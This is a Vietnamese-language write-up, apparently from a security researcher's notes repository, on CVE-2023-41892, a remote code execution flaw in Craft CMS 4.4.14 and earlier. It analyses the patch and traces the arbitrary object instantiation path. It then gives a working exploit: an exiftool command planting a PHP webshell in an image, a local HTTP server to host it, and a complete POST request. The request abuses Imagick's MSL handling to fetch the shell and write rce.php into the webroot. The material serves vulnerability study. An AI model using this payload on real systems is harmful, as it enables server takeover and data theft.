# CVE-2023-41892

## Summary

Lỗ hổng cho phép kẻ tấn công có thể tạo bất kỳ object dẫn đến có thể Remote Code Execution ở các phiên bản <= 4.4.14 của CraftCMS.
## The patch

Ở bản vá đã thực hiện thêm hàm `Component::cleanseConfig` để filter một số config độc hại lấy từ người dùng
![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/155daeb1-2f3c-40a6-8599-5a1ce15ca582)

hàm `Component::cleanseConfig` sẽ lọc các keys bắt đầu bằng `on ` hoặc `as ` từ config
![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/e02c938f-331c-4b63-b5af-6e9aebc28462)

## Analysis

Đoạn code chứa lỗ hổng
![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/39db9583-7646-498e-9b08-0e5f296c4a2f)

ở đây ta có thể thấy rằng ta có thể hoàn toàn control được giá trị của `$baseConfig` thông qua tham số `config` được gửi qua body, ngoài ra, ở `$baseConfig` phải chứa `name` element là tên tham số sẽ được lấy tiếp theo sau đó từ body để thực hiện call vào hàm `$conditionsService->createCondition()`

Tham số `$config` được truyền vào hàm `createCondition()` phải chứa một `class` element và class này phải là subclass của `ConditionInterface`

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/5bf65058-9608-4318-ab1d-ab9dcfe95ed6)

theo như document, có một số class implement từ interface này

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/ca5fd88a-c8b4-41e7-a106-a5a52907e647)

ta có thể chọn bất kỳ class nào, ở đây mình sẽ chọn `craft\elements\conditions\entries\EntryCondition` để pass qua hàm này và tiếp tục flow chương trình.

Tiếp tục trace tiếp vào hàm `Craft::configure()` sẽ thực hiện gán giá trị của các thuộc tính chỉ định từ `$baseConfig` vào object `$this->_condition` được tạo từ bên trên.

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/14d5d283-9d3c-47a9-ac42-48c2abac2eec)

việc gán giá trị cho các thuộc tính được handle bởi hàm `Component::__set()`

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/cff16864-8363-4d18-9e1f-4029e3775d10)

điều đặc biệt xảy ra khi tên thuộc tính bắt đầu bằng `as ` thì sẽ lầm tưởng là đang attach behavior, lúc này sẽ tiếp tục gọi hàm `Yii::createObject($value)` để tạo một object mới và trong đó `$value` là input đầu vào ta có thể control được.

Trace tiếp vào hàm `Yii::createObject()` cho ta có thể tạo bất kỳ object của class nào với tên class được lấy từ element của `$type` (giá trị $value ở trên)

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/8ade8372-683e-46d6-a751-6d5e78d91299)

Tiếp tục theo dõi flow chương trình, call stack ta được như sau:

```
yiisoft/yii2/di/Container.php::get()
  yiisoft/yii2/di/Container.php::build()
    Reflection/ReflectionClass.php::newInstanceArgs()
```

Ở hàm `yiisoft/yii2/di/Container.php::build()` cho phép ta có thể chèn tham số constructor vào object được khởi tạo bằng các element được define bên trong `__construct()` element của config và sẽ merge với biến `$dependencies`.

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/531ac98b-15a8-4a49-81cf-9aa0e8007c32)

và `$dependencies` cũng giá các tham số đầu vào cho hàm contructor của class mà ta muốn tạo

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/8e7683be-877d-4d91-8bd4-4f0999aa2709)

## Exploit

Vì có thể tạo một object bất kỳ và có thể control được tham số đầu vào của constructor, nên tiếp theo ta sẽ lạm dụng `Imagick` extension để upload webshell thông qua `VID scheme`. Chi tiết tại ![https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

Cụ thể ta có thể download một file webshell dưới định dạng image và lưu vào trên target machine với định dạng `.php` thông qua `Imagick` extension, và bởi vì `VID scheme` chấp nhận định dạng marks nên có thể parse các file `msl` được upload vào tập tin tạm thời là `/tmp/php*`

Thực hiện chèn PHP code vào một ảnh bất kỳ và khởi chạy HTTP server để target machine có thể download:

```
$ exiftool -DocumentName='<?=`$_GET[0]`;?>' shell.jpg
$ python3.8 -m http.server 1337
```

PoC:

```
POST /index.php HTTP/1.1
Host: localhost:8888
Content-Length: 1461
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypSvatoPRplNvrNGd
Cookie: nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; CraftSessionId=0vc0g6bb1br4ppf2tr9hjgbvpg; 6e635ee931705f21d65dfc3ae1f9a2a6_identity=53c24b2a815cf15a10b4955fe363be9b98d38304a5dd8fc3c2aee30db5b346eca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%226e635ee931705f21d65dfc3ae1f9a2a6_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22W4C8bEEAHCqSYw-NlImIEkO0MQkRTkQ8H8G0wSXH8vSgpuL4VwAEjTl66WQcMUysx4Y6uzmXmpknQpEDsiuXelRFsoAm1EXAl7Sr%5C%22%2Cnull%2C%5C%22e27f3cedd2be95970edc90a8fc3c7bd4%5C%22%5D%22%2C3600%5D%22%3B%7D; CRAFT_CSRF_TOKEN=f9baddf281822c01d2cadbc8db777a4e03972efe894fdf75215d3f3b5d16274ba%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22iEdba8D_itPehXXLiOErjHnzCXLiuymzSO6ol9uN%7Cdd4dd09128a96361ba9c614c43f63325ba206c3cddb647474f153bfb7895ba53iEdba8D_itPehXXLiOErjHnzCXLiuymzSO6ol9uN%7C1%22%3B%7D; 6e635ee931705f21d65dfc3ae1f9a2a6_username=7bc32793155ee94a442fa02b5e6aba8cd5ef354dd1252dcb073a6926b8304cd6a%3A2%3A%7Bi%3A0%3Bs%3A41%3A%226e635ee931705f21d65dfc3ae1f9a2a6_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; XDEBUG_SESSION=PHPSTORM
Connection: close

------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="CRAFT_CSRF_TOKEN"

i8QaMf8rGq_EFuFGc1I0EFdQElqltotTAbkiSR_E5hxFdeopG6sksrKIXM1cRwM2iP2LjfSumbgef9pCa_6bDU8S7jjEBQISeqv7EdA01trX3i5csOyZmBjXmRXUp6GWapIjWTGs2Faf4-UVAn7FxgrNF7CdLbm55jQBMt8LR6zxELNk1y9omAsTiGnMj2HbjvGB4oF-U54TXvCtYrEjGwpsXD4fVyjP_uUpQuFuIGq9i2YWOtxGd5JR_M7sOPk4IzMPuc-z7M2Yqo4vHbt7CMiqOSwm3V7yNjEgT8maI-ACtem0uko-htiurC_j_yThlMPwCKUbYATOuWOsiqBxYB_9glWkY-D4ReHhql1Od61hD8KLU-sovloR9XFAx1-j41iuwI2w
------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="action"

conditions/render
------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="config"

{"name":"nhienit","as methods":{"class":"Imagick","__construct()":{"files":"vid:msl:/Applications/MAMP/tmp/php/php*"}}}
------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="nhienit[class]"

craft\elements\conditions\entries\EntryCondition
------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="nhienit[config]"

{}
------WebKitFormBoundarypSvatoPRplNvrNGd
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://127.0.0.1:1337/shell.jpg" />
 <write filename="../../../../../../../../../../Applications/MAMP/htdocs/craft/web/rce.php" />
</image>
------WebKitFormBoundarypSvatoPRplNvrNGd--
```

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/b443eeaf-60f0-4c89-a8b6-385dedd9aef4)

![image](https://github.com/nhienit2010/CVE-Notes/assets/44127534/9f632e5e-e465-4b72-9a66-ca3441b4f580)


## Refs

- https://blog.calif.io/p/craftcms-rce
- https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g
- https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
